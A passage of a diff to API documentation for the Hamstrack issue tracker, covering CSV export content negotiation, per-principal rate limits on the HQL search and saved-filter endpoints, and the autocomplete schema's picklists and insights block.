+Caching is the family's (`private, max-age=60` + `Vary: Authorization`): a download is still a live read over one tenant's data. The throttle is the family's too — these six sit under `…/reports/**`, so they spend the same [reports budget](#how-every-report-behaves) as their JSON twins, and a `429` is possible on any of them.
+
+One thing is specific to the exports: they declare `produces: text/csv`, so **an `Accept` header that excludes `text/csv` is a `406`** rather than a CSV body labelled as JSON. Error responses are unaffected — a `400`, `404` or `429` on a `.csv` path still comes back as `application/problem+json`.
+
 ## Search (HQL)
 
 Search issues across a whole workspace with **HQL** (Hamstrack Query Language) — a small, readable query language. Results are cross-project but always restricted to the caller's **visible (non-archived) projects**; this scope is enforced server-side and no query text can widen it. All three endpoints require workspace membership (`404` for a non-member).
+
+**All three are throttled**, and until recently none of them was. They share a **per-principal budget of 120 requests per minute** across the whole `…/search/**` path; past it the answer is `429` with a `Retry-After` header (seconds). The same budget also covers **every [saved-filter](#saved-filters) operation** under `…/filters/**` — `GET` and `DELETE` included, since the binding is by path and not by method — because **HQL validation is search-surface work wherever it is mounted**: validating a filter builds the same resolution context `GET …/search/schema` pays for (roughly eight statements, including a workspace-wide label projection and a full member scan), so `POST …/filters` with a deliberately invalid body was an unthrottled eight-query refusal loop. It is charged here rather than to the reports pot because a saved filter *is* a saved search: the same person doing the same work. It is a retryable throttle, not a fault — nothing was computed, and the identical request succeeds after the wait. The budget is **separate from the [reports](#reports) budget** on purpose, because a person typing in a search box legitimately fires several requests a minute. It is spent **before** the workspace is resolved, so an over-budget caller is refused even for a workspace they cannot see, and the `429` looks identical for a real workspace and a nonexistent one. Note that these are the *expensive* endpoints rather than the cheap ones: a query may carry dozens of text predicates that compile to unanchored, unindexable scans over a text column, and the whole predicate runs **twice** per request (count, then page). The [Insights panel](#insights--break-down-the-query-in-the-search-box) sits on this path too and spends this budget **as well as** the reports one. The counters live **in memory on each app node**, so a deployment running several instances gives each caller that budget *per instance* rather than one budget overall — it damps an abuse vector rather than enforcing an invariant, so a split budget is a weaker guard and never a wrong answer. Do not quote it as a global quota.
 
 | Method | Path | Auth | Description |
 |---|---|---|---|
@@ -2009,6 +2685,8 @@ More examples: `type = Bug AND priority >= High AND due IS NOT EMPTY` · `assign
 The asymmetry that follows is deliberate, and integrations need to expect it: **the suggested set is no longer the same as the resolvable set.** Because capabilities never delete or block data, a Kanban project may legitimately own sprints and a `releases: false` project may legitimately own versions; those names vanish from suggestions while still matching in queries. Do not use `/search/schema` as a validator for a query you are about to send — the query endpoint is the only authority on what resolves.
 
 **Schema** — `GET /search/schema` drives autocomplete: `fields` describes each queryable field (`name`, data-type `type`, allowed `operators`, `nullable`, `sortable`, `valueSuggest`, `functions`) — the system fields first, then your visible **custom fields** (`name` = the field `key`, `type` = its custom `FieldType`) — `keywords` lists the HQL keywords, and `values` holds the small picklists (`STATUS`/`TYPE`/`PRIORITY`) of names reachable by your visible projects, a `LABEL` picklist of the workspace's non-archived label names, a `COMPONENT` picklist of the non-archived component names of those visible projects, a `VERSION` picklist of the non-archived version names of those projects **that have `releases` on** (**one** picklist serves both `fixVersion` and `affectsVersion` — the two roles draw from the same catalog, so both fields declare `valueSuggest: "VERSION"`), a `SPRINT` picklist of the **open** (non-completed) sprint names of those projects **that have `board: SCRUM`**, plus a `CUSTOM:<key>` entry per SELECT/MULTI_SELECT custom field (options as `{label, value=optionId}`). The `LABEL`, `COMPONENT`, `VERSION` and `SPRINT` picklists are **capped at 200 entries** each — a workspace can accumulate far more, so fall back to `/search/suggest?field=label` / `?field=component` / `?field=fixVersion` beyond that. **`sprint` is the exception: it has no `/search/suggest` fallback** (`?field=sprint` returns the usual `422`), because a project's open sprints are already bounded and cannot realistically overflow the picklist. `storyPoints` has no picklist at all — it is numeric. The member list (including USER custom fields) is deliberately **not** embedded — use `/search/suggest` for it. The system-field half of `fields`, and the `SPRINT` / `VERSION` picklists, are **capability-aware** (above): a field or a name that is missing here is still perfectly queryable.
+
+The response also carries an **`insights`** block — `{measures, dimensions}` — listing what the [Insights panel](#insights--break-down-the-query-in-the-search-box) is worth being offered on this page. It is narrowed on exactly the same terms: `SPRINT` appears among the dimensions only when at least one visible project has `board: SCRUM`, and `POINTS` among the measures only when at least one has `estimation` on, mirroring the `sprint` and `storyPoints` fields above. One list serves both `slice` and `segment` (grouping is symmetric; the only rule is that the two must differ). And it is suggestion-only in the same way: **a dimension omitted here still resolves if the panel asks for it**, so a saved panel state cannot break because a curator flipped a project toggle.
 
 ```json
 {
